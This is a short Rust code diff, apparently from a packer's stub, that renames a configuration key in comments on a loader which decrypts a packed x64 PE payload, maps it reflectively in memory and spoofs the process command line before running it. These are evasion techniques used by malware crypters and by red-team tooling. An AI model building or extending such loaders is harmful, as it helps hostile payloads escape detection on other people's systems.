@@ -77,7 +77,7 @@ enum ReflectiveLoadingError {
     VirtualProtectFailed { section: String, error: u32 },
     #[error("could not provision the payload's TLS (no index or no memory)")]
     TlsUnavailable,
-    /// `build.payload.export` names a symbol the payload does not export.
+    /// `build.payloads.<name>.export` names a symbol the payload does not export.
     #[error("the payload does not export '{name}'")]
     ExportNotFound { name: String },
 }
@@ -159,7 +159,7 @@ impl BaseRelocationEntry {
 /// Reflectively loads `payload` in the current process and returns the exit
 /// code of its entry point.
 ///
-/// When `export` is set (`build.payload.export`, only meaningful for
+/// When `export` is set (`build.payloads.<name>.export`, only meaningful for
 /// `format: dll`), that exported function is called instead of the image's
 /// entry point: a mapped DLL's `DllMain` only initializes the library, so a
 /// named export is how a DLL payload does real work.
@@ -791,7 +791,7 @@ fn execute_payload(image: &mut [u8]) -> Result<i32, String> {
     // args>` first, so the payload receives its arguments instead of the
     // stub's own command line (process argument spoofing).
     crate::patch_command_line()?;
-    // `build.payload.export`: a DLL export to call instead of the entry point.
+    // `build.payloads.<name>.export`: a DLL export to call instead of the entry point.
     let export: Option<String> = $DLL_EXPORT_DEF$;
     // SAFETY: `image` is the decrypted, valid x64 PE produced by the packer.
     unsafe { run_reflective(image, export.as_deref()) }.map_err(|e| e.to_string())
